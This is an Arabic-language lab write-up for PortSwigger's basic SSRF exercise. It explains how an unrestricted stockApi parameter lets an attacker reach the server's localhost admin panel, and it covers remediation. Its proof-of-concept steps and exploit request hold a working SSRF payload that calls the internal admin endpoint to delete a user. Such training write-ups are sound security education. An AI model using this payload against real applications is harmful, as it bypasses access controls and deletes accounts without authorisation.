# Lab 01 — Basic SSRF Against the Local Server (استهداف السيرفر المحلي المباشر)

[![التصنيف](https://img.shields.io/badge/الفئة-SSRF-red)]()
[![النوع](https://img.shields.io/badge/النوع-Server-Side%20Request%20Forgery%20(Localhost%20Loopback)-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-عالي%20(High)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/ssrf)

> هذا الشرح جزء من سلسلة [معامل تزوير الطلبات (SSRF)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 01 — Basic SSRF Against the Local Server (استهداف السيرفر المحلي المباشر) |
| **تصنيف الثغرة** | Server-Side Request Forgery (Localhost Loopback) |
| **معيار الضعف (CWE)** | CWE-918: Server-Side Request Forgery (SSRF) |
| **مستوى الخطورة** | عالي (High) |
| **الهدف من اللاب** | الوصول إلى لوحة الإدارة المحلية http://localhost/admin وحذف المستخدم carlos. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

يقدم الموقع ميزة فحص كمية المخزون لمنتج معين. عندما يضغط المستخدم زر الفحص، يرسل المتصفح طلباً يحتوي على رابط الخدمة التي سيتصل بها السيرفر:
`POST /product/stock` مع بيانات `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1`.

**الخلل الفكري هنا:** يقوم خادم الويب بأخذ قيمة `stockApi` كاملة وعمل طلب HTTP إليها دون أي قيود! وفي نفس الوقت، يحتوي السيرفر على لوحة إدارة على المسار الداخلي `http://localhost/admin` مبرمجة بحيث ترفض أي اتصال قادم من الإنترنت الخارجي وتسمح فقط لمن يتصل من داخل السيرفر نفسه.
عندما يقوم المهاجم باستبدال رابط المخزون برابط اللوحة المحلية `stockApi=http://localhost/admin`، يقوم السيرفر بطلب الصفحة بنفسه ويجلب كود لوحة الأدمن ويعرضه للمهاجم!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يستغل ميزة فحص المخزون لتوجيه السيرفر إلى عنوان الـ Loopback المحلي الخاص به للوصول للوحة الإدارة المحمية خارجياً.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
المطور جعل جهة العميل تحدد الرابط الخادمي بالكامل دون حظر عناوين الـ Loopback أو عزل الشبكة الداخلية.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. تصفح أي منتج في المتجر واضغط على زر **Check stock**.
2. التقط طلب `POST /product/stock` في Burp Suite وأرسله إلى **Repeater**.
3. لاحظ باراميتر `stockApi` في جسم الطلب.
4. استبدل قيمة الباراميتر لتصبح:
`stockApi=http://localhost/admin` واضغط Send.
5. ستلاحظ أن السيرفر استجاب بـ `200 OK` وعرض صفحة لوحة الإدارة وفيها أزرار حذف المستخدمين!
6. الآن، لتنفيذ أمر الحذف، عدل الرابط ليصبح:
`stockApi=http://localhost/admin/delete?username=carlos`.
7. اضغط Send: سيتم حذف المستخدم carlos بنجاح ويحل اللاب.

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /product/stock HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost/admin/delete?username=carlos
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 302 Found
Location: /admin
...
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تجاوز كامل لجدران الحماية الخارجية والوصول لأي خدمة أو لوحة مخصصة للاستخدام المحلي فقط.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

منع المستخدم من إرسال روابط كاملة، أو حظر الاتصال بالعناوين المحلية (`127.0.0.1`, `localhost`) على مستوى كود التطبيق وجدار الحماية.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP Top 10 — A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
